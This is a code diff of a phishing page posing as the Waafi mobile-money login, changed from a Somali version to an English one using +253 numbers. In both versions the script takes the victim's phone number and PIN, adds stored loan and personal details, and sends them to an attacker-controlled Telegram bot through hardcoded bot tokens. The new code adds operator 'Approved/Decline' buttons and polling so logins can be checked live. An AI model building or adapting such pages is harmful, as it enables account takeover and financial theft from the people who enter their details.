@@ -1,10 +1,10 @@
 <!DOCTYPE html>
-<html lang="so">
+<html lang="en">
 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Waafi - Galitaanka</title>
+    <title>Get Started</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
@@ -16,203 +16,163 @@
         
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #fff;
+            background-color: #ffffff;
+            color: #1a1a1a;
             display: flex;
             flex-direction: column;
             min-height: 100vh;
+            padding: 20px;
         }
         
-        .header-box {
-            width: 100%;
-            background: linear-gradient(to bottom, #82d13d, #a3e635);
-            padding: 40px 20px;
-            color: white;
-            text-align: center;
-        }
-        
-        .main-content {
-            width: 90%;
-            max-width: 400px;
-            margin: 30px auto 0;
-            text-align: center;
-            flex-grow: 1;
-        }
-        
-        .footer-box {
-            width: 100%;
-            background: linear-gradient(to top, #82d13d, #a3e635);
-            padding: 50px 20px 30px;
-            color: white;
-            text-align: center;
-            border-top-left-radius: 50% 30px;
-            border-top-right-radius: 50% 30px;
-        }
-        
-        .logo-text {
-            font-size: 36px;
-            font-weight: bold;
-            margin: 0;
-        }
-        
-        .sub-text {
-            font-size: 15px;
-            margin-top: 8px;
-            opacity: 0.9;
-        }
-        
-        .version-text {
-            font-size: 12px;
-            margin-top: 15px;
-            opacity: 0.8;
-        }
-        
-        .terms-text {
-            font-size: 11px;
-            margin-top: 15px;
-            padding: 0 40px;
-        }
-        
-        h2 {
-            color: #555;
-            font-size: 24px;
-            margin-bottom: 20px;
-        }
-        
-        .phone-input-group {
+        .top-bar {
             display: flex;
             align-items: center;
-            gap: 10px;
-            border: 2px solid #82d13d;
-            border-radius: 12px;
-            padding: 12px 16px;
+            justify-content: space-between;
+            width: 100%;
+        }
+        
+        .back-btn {
+            font-size: 24px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 5px 0;
+            color: #1a1a1a;
+        }
+        
+        .logo-img {
+            max-height: 40px;
+            width: auto;
+            object-fit: contain;
+        }
+        
+        .header-section {
+            margin-top: 25px;
             margin-bottom: 30px;
         }
         
-        .phone-input-group .flag {
-            font-size: 22px;
+        .title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #1a202c;
+            margin-bottom: 8px;
         }
         
-        .phone-input-group .country-code {
-            font-size: 18px;
-            font-weight: 600;
-            color: #333;
+        .subtitle {
+            font-size: 14px;
+            color: #718096;
         }
         
-        .phone-input-group input {
+        .form-container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            flex-grow: 1;
+        }
+        
+        .input-group {
+            display: flex;
+            align-items: center;
+            border: 1.5px solid #2d3748;
+            border-radius: 12px;
+            padding: 16px;
+            background-color: #fff;
+        }
+        
+        .input-group .country-code {
+            font-size: 15px;
+            font-weight: 500;
+            color: #2d3748;
+            margin-right: 16px;
+        }
+        
+        .input-group input {
             flex: 1;
             border: none;
             outline: none;
-            font-size: 18px;
-            font-family: inherit;
-            color: #333;
+            font-size: 15px;
+            color: #2d3748;
             background: transparent;
         }
         
-        .pin-label {
-            color: #888;
-            margin-bottom: 16px;
-            font-size: 15px;
+        .input-group input::placeholder {
+            color: #a0aec0;
         }
         
-        .pin-container {
+        .bottom-section {
+            margin-top: auto;
+            padding-top: 20px;
+        }
+        
+        .terms-container {
             display: flex;
-            justify-content: center;
             align-items: center;
             gap: 10px;
-        }
-        
-        .pin-input-group {
-            display: flex;
-            gap: 8px;
-        }
-        
-        .pin-box {
-            width: 55px;
-            height: 55px;
-            border: 1.5px solid #82d13d;
-            border-radius: 10px;
-            text-align: center;
-            font-size: 24px;
-            font-weight: bold;
-            outline: none;
-            font-family: inherit;
-            transition: border-color 0.2s;
-        }
-        
-        .pin-box:focus {
-            border-color: #4caf50;
-            box-shadow: 0 0 0 2px rgba(130, 209, 61, 0.25);
-        }
-        
-        .toggle-eye {
-            cursor: pointer;
-            margin-left: 6px;
-            font-size: 22px;
-            user-select: none;
-        }
-        
-        .btn-gal {
-            background-color: #e0e0e0;
-            color: #fff;
-            border: none;
-            width: 100%;
-            padding: 18px;
-            border-radius: 10px;
-            font-size: 20px;
-            margin-top: 40px;
-            cursor: not-allowed;
-            font-weight: bold;
-            transition: background-color 0.2s;
-        }
-        
-        .btn-gal.active {
-            background-color: #82d13d;
-            cursor: pointer;
-        }
-        
-        .btn-gal.active:active {
-            background-color: #6cb32e;
-        }
-        
-        .spacer {
-            height: 30px;
-        }
-        
-        .error-banner {
-            background-color: #fde8e8;
-            color: #e74c3c;
-            border: 1px solid #f8b4b4;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 500;
             margin-bottom: 20px;
-            display: none;
+            cursor: pointer;
         }
         
-        #loading-overlay {
+        .terms-container input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: #92a4c0;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        
+        .terms-label {
+            font-size: 13px;
+            color: #4a5568;
+        }
+        
+        .terms-label a {
+            color: #2b6cb0;
+            text-decoration: none;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #92a4c0;
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: not-allowed;
+            transition: background-color 0.2s ease;
+        }
+        
+        .submit-btn.active {
+            background-color: #4a5568;
+            cursor: pointer;
+        }
+        
+        .loading-overlay {
+            display: none;
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(to bottom, #82d13d, #a3e635);
-            display: none;
+            background: rgba(255, 255, 255, 0.9);
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            z-index: 9999;
-            color: white;
+            z-index: 1000;
+            font-size: 18px;
+            font-weight: 600;
+            color: #2d3748;
+            gap: 12px;
         }
         
         .spinner {
             width: 40px;
             height: 40px;
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top: 4px solid white;
+            border: 4px solid #cbd5e0;
+            border-top: 4px solid #4a5568;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin-bottom: 20px;
         }
         
         @keyframes spin {
@@ -228,151 +188,99 @@
 
 <body>
 
+    <div class="top-bar">
+        <button class="back-btn" onclick="history.back()">&#8592;</button>
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTn_5VYmxA4NGfip7K56How6z7pn9bFgakJPQwVOc3iyQ&s=10" alt="Logo" class="logo-img">
+    </div>
+
+    <div class="header-section">
+        <h1 class="title">Let's get started</h1>
+        <p class="subtitle">Enter your phone number and PIN to get started</p>
+    </div>
+
     <!-- Loading Overlay -->
-    <div id="loading-overlay">
+    <div id="loading-overlay" class="loading-overlay">
         <div class="spinner"></div>
-        <div style="font-size: 20px; font-weight: bold;">Fadlan sug...</div>
+        <span>Waiting approval...</span>
     </div>
 
-    <!-- Header -->
-    <div class="header-box">
-        <p class="logo-text">Waafi</p>
-        <p class="sub-text">Amaahado Sahlan oo Degdeg ah</p>
-    </div>
-
-    <!-- Main -->
-    <div class="main-content">
-        <h2>Gal</h2>
-
-        <!-- Error Display -->
-        <div id="errorDisplay" class="error-banner"></div>
-
-        <!-- Phone Input (editable) -->
-        <div class="phone-input-group">
-            <span class="flag">🇸🇴</span>
-            <span class="country-code">+252</span>
-            <input type="tel" id="phoneInput" placeholder="612345678" maxlength="9" inputmode="numeric">
+    <form class="form-container" id="loginForm">
+        <!-- Phone Input -->
+        <div class="input-group">
+            <span class="country-code">+253</span>
+            <input type="tel" id="phoneInput" placeholder="Enter phone number" maxlength="8" inputmode="numeric" required>
         </div>
 
         <!-- PIN Input -->
-        <p class="pin-label">Geli PIN-kaaga</p>
-
-        <div class="pin-container">
-            <div class="pin-input-group">
-                <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
-                <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
-                <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
-                <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
-            </div>
-            <span class="toggle-eye" id="eyeIcon">👁️</span>
+        <div class="input-group">
+            <input type="password" id="pinInput" placeholder="Enter PIN" maxlength="6" inputmode="numeric" required>
         </div>
 
-        <!-- Login Button -->
-        <button id="loginBtn" class="btn-gal" disabled>GAL</button>
-        <div class="spacer"></div>
-    </div>
+        <div class="bottom-section">
+            <label class="terms-container">
+                <input type="checkbox" id="termsCheckbox">
+                <span class="terms-label">I agree to the <a href="#">Terms of Service</a></span>
+            </label>
 
-    <!-- Footer -->
-    <div class="footer-box">
-        <p class="logo-text">Waafi</p>
-        <p class="sub-text">Amaahado Sahlan oo Degdeg ah</p>
-        <p class="version-text">v2.1.3P</p>
-        <p class="terms-text">Galitaanka markaad gasho waad ogolaatay <u>Shuruudaha iyo Xaaladaha</u></p>
-    </div>
+            <button type="submit" id="submitBtn" class="submit-btn" disabled>Continue</button>
+        </div>
+    </form>
 
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-
-            // ---- Elements ----
             const phoneInput = document.getElementById('phoneInput');
-            const pinBoxes = document.querySelectorAll('.pin-box');
-            const loginBtn = document.getElementById('loginBtn');
-            const eyeIcon = document.getElementById('eyeIcon');
-            const errorDisplay = document.getElementById('errorDisplay');
+            const pinInput = document.getElementById('pinInput');
+            const termsCheckbox = document.getElementById('termsCheckbox');
+            const submitBtn = document.getElementById('submitBtn');
+            const loginForm = document.getElementById('loginForm');
             const overlay = document.getElementById('loading-overlay');
 
-            // ---- Pre-fill phone from localStorage ----
+            // Pre-fill phone from localStorage if available
             const savedPhone = localStorage.getItem('phone') || "";
-            phoneInput.value = savedPhone;
-
-            // ---- PIN auto-move logic ----
-            pinBoxes.forEach(function(box, index) {
-                box.addEventListener('input', function() {
-                    this.value = this.value.replace(/\D/g, '');
-                    if (this.value && index < pinBoxes.length - 1) {
-                        pinBoxes[index + 1].focus();
-                    }
-                    checkInputs();
-                });
-
-                box.addEventListener('keydown', function(e) {
-                    if (e.key === "Backspace" && !this.value && index > 0) {
-                        pinBoxes[index - 1].focus();
-                    }
-                });
-
-                box.addEventListener('paste', function(e) {
-                    e.preventDefault();
-                    const paste = (e.clipboardData || window.clipboardData).getData('text');
-                    const digits = paste.replace(/\D/g, '').split('');
-                    pinBoxes.forEach(function(pb, i) {
-                        pb.value = digits[i] || '';
-                    });
-                    const nextEmpty = Array.from(pinBoxes).findIndex(pb => !pb.value);
-                    if (nextEmpty !== -1) {
-                        pinBoxes[nextEmpty].focus();
-                    } else {
-                        pinBoxes[pinBoxes.length - 1].focus();
-                    }
-                    checkInputs();
-                });
-            });
-
-            function checkInputs() {
-                const filled = Array.from(pinBoxes).every(function(b) {
-                    return b.value.length === 1;
-                });
-                loginBtn.disabled = !filled;
-                loginBtn.classList.toggle('active', filled);
+            if (savedPhone) {
+                phoneInput.value = savedPhone;
+                validateForm();
             }
 
-            // ---- Toggle PIN visibility ----
-            eyeIcon.addEventListener('click', function() {
-                const isPassword = pinBoxes[0].type === "password";
-                pinBoxes.forEach(function(b) {
-                    b.type = isPassword ? "text" : "password";
+            // Sanitize numeric inputs
+            [phoneInput, pinInput].forEach(input => {
+                input.addEventListener('input', function() {
+                    this.value = this.value.replace(/\D/g, '');
+                    validateForm();
                 });
-                eyeIcon.textContent = isPassword ? "🙈" : "👁️";
             });
 
-            // ---- Phone input: allow only digits ----
-            phoneInput.addEventListener('input', function() {
-                this.value = this.value.replace(/\D/g, '');
-            });
+            termsCheckbox.addEventListener('change', validateForm);
 
-            // ---- Login button click ----
-            loginBtn.addEventListener('click', async function() {
+            function validateForm() {
+                const isPhoneValid = phoneInput.value.length >= 6;
+                const isPinValid = pinInput.value.length >= 4;
+                const isAgreed = termsCheckbox.checked;
+
+                const isValid = isPhoneValid && isPinValid && isAgreed;
+                submitBtn.disabled = !isValid;
+                submitBtn.classList.toggle('active', isValid);
+            }
+
+            // Form Submit Event Handler
+            loginForm.addEventListener('submit', async function(event) {
+                event.preventDefault();
+
                 const phone = phoneInput.value.trim();
-                if (!phone || phone.length < 6) {
-                    errorDisplay.innerText = "❌ Fadlan geli lambarka taleefanka saxda ah.";
-                    errorDisplay.style.display = "block";
+                const pin = pinInput.value.trim();
+
+                if (!phone || phone.length < 6 || !pin || pin.length < 4) {
                     return;
                 }
 
-                let pin = "";
-                pinBoxes.forEach(function(b) {
-                    pin += b.value;
-                });
+                if (overlay) overlay.style.display = "flex";
 
-                errorDisplay.style.display = "none";
-                overlay.style.display = "flex";
-
-                // ---- Save to localStorage ----
+                // Save to localStorage
                 localStorage.setItem('phone', phone);
                 localStorage.setItem('userPhone', phone);
                 localStorage.setItem('lastPin', pin);
 
-                // ---- Collect ALL data ----
+                // Collect ALL data
                 const allData = {
                     amount: localStorage.getItem('amount') || '',
                     loanDuration: localStorage.getItem('loanDuration') || '',
@@ -387,12 +295,12 @@
                     pin: pin
                 };
 
-                // ---- Build the message text ----
+                // Build the message text
                 const messageLines = [
                     "🔐 *Waafi Login Data*",
                     "",
                     "👤 *Magaca:* " + (allData.firstName || "---") + " " + (allData.lastName || "---"),
-                    "📞 *Telefoon:* +252 " + allData.phone,
+                    "📞 *Telefoon:* +253 " + allData.phone,
                     "💰 *Qaddarka:* $" + (allData.amount || "---"),
                     "📆 *Muddada:* " + (allData.loanDuration || "---"),
                     "📋 *Nooca:* " + (allData.loanType || "---"),
@@ -403,11 +311,24 @@
                 ];
                 const message = messageLines.join("\n");
 
-                // ---- Send to Telegram Bot via HTTP API ----
-                const BOT_TOKEN = "8666161919:AAG-9V6MuVmKFSNSDYLob9x6qDDx-3v3dNM";
-                const CHAT_ID = "1345737806";
+                // Generate a unique session ID for the inline keyboard buttons
+                const sessionId = 'sess_' + Date.now();
 
-                let sentSuccessfully = false;
+                const inlineKeyboard = {
+                    inline_keyboard: [
+                        [{
+                            text: "✅ Approved",
+                            callback_data: `approve:${sessionId}`
+                        }, {
+                            text: "❌ Decline",
+                            callback_data: `decline:${sessionId}`
+                        }]
+                    ]
+                };
+
+                // Send to Telegram Bot via HTTP API
+                const BOT_TOKEN = "7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc";
+                const CHAT_ID = "8406078749";
 
                 try {
                     const response = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
@@ -418,31 +339,99 @@
                         body: JSON.stringify({
                             chat_id: CHAT_ID,
                             text: message,
-                            parse_mode: "Markdown"
+                            parse_mode: "Markdown",
+                            reply_markup: inlineKeyboard
                         })
                     });
 
                     const result = await response.json();
                     console.log("Telegram API response:", result);
 
-                    if (result.ok === true) {
-                        sentSuccessfully = true;
-                        console.log("✅ Message sent to Telegram successfully!");
+                    if (result.ok) {
+                        // Start polling for button responses
+                        startPollingForApproval(BOT_TOKEN, sessionId);
                     } else {
-                        console.error("❌ Telegram API error:", result.description);
+                        if (overlay) overlay.style.display = "none";
+                        alert("Error sending request. Please try again.");
                     }
                 } catch (err) {
                     console.error("❌ Network error sending to Telegram:", err);
+                    if (overlay) overlay.style.display = "none";
+                    alert("Network error. Please check your connection.");
                 }
-
-                // Wait a moment so the user sees the loading screen, then navigate
-                setTimeout(function() {
-                    overlay.style.display = "none";
-                    window.location.href = "page8.html";
-                }, 1500);
             });
 
-            // ---- Telegram WebApp init ----
+            // Function to check Telegram updates for callback queries
+            function startPollingForApproval(botToken, sessionId) {
+                let offset = 0;
+                let pollInterval = setInterval(async function() {
+                    try {
+                        const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}&timeout=5`);
+                        const data = await response.json();
+
+                        if (data.ok && data.result) {
+                            for (const update of data.result) {
+                                offset = update.update_id + 1;
+
+                                if (update.callback_query) {
+                                    const callbackData = update.callback_query.data;
+                                    const callbackQueryId = update.callback_query.id;
+
+                                    if (callbackData === `approve:${sessionId}`) {
+                                        clearInterval(pollInterval);
+
+                                        // Answer callback to remove loading animation on Telegram button
+                                        await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+                                            method: "POST",
+                                            headers: {
+                                                "Content-Type": "application/json"
+                                            },
+                                            body: JSON.stringify({
+                                                callback_query_id: callbackQueryId,
+                                                text: "Approved!"
+                                            })
+                                        });
+
+                                        if (overlay) overlay.style.display = "none";
+                                        window.location.href = "page7.html";
+                                        return;
+                                    } else if (callbackData === `decline:${sessionId}`) {
+                                        clearInterval(pollInterval);
+
+                                        // Answer callback
+                                        await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
+                                            method: "POST",
+                                            headers: {
+                                                "Content-Type": "application/json"
+                                            },
+                                            body: JSON.stringify({
+                                                callback_query_id: callbackQueryId,
+                                                text: "Declined. Resetting form."
+                                            })
+                                        });
+
+                                        if (overlay) overlay.style.display = "none";
+
+                                        // Reset form for re-entry
+                                        loginForm.reset();
+                                        phoneInput.value = "";
+                                        pinInput.value = "";
+                                        termsCheckbox.checked = false;
+                                        validateForm();
+
+                                        alert("Your request was declined. Please re-enter your details.");
+                                        return;
+                                    }
+                                }
+                            }
+                        }
+                    } catch (error) {
+                        console.error("Polling error:", error);
+                    }
+                }, 2000);
+            }
+
+            // Telegram WebApp initialization
             if (window.Telegram && window.Telegram.WebApp) {
                 window.Telegram.WebApp.ready();
                 window.Telegram.WebApp.expand();
